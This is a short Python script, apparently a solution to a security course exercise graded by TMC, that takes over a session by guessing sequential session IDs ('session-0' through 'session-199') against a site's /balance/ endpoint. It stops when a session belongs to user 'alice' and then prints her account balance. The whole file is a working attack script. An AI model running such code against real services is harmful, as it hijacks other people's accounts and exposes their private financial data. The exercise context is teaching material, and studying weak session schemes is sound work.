import sys
import requests
import json


def test_session(address):
    # write your code here
    for i in range(200):
        cookies = {'sessionid': f'session-{i}'}
        r = requests.get(f'{address}/balance/', cookies=cookies)
        if r.json().get('username') == "alice":
            return r.json().get('balance')

    return None


def main(argv):
    address = sys.argv[1]
    print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('usage: python %s address' % sys.argv[0])
    else:
        main(sys.argv)
